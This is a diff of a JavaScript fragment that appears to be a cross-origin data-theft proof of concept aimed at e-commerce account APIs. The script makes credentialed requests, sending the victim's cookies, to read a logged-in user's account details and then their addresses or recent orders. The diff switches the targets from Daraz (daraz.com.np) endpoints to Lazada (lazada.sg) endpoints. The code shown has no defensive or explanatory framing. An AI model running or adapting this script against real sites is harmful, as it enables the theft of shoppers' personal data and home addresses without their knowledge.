@@ -2,7 +2,7 @@
 var xhr = new XMLHttpRequest();
 
 // Set up the first request
-xhr.open('GET', 'https://member.daraz.com.np/user/api/getUser', true);
+xhr.open('GET', 'https://member.lazada.sg/user/api/getUser', true);
 xhr.withCredentials = true; // Send cookies with the request
 
 var acc_details, address_user;
@@ -17,7 +17,7 @@ xhr.onload = function() {
     var secondXhr = new XMLHttpRequest();
 
     // Set up the second request
-    secondXhr.open('GET', 'https://my.daraz.com.np/api/recentOrders/', true);
+    secondXhr.open('GET', 'https://member.lazada.sg/address/api/listAddress', true);
     secondXhr.withCredentials = true; // Send cookies with the request
 
     // Define what happens on successful data retrieval
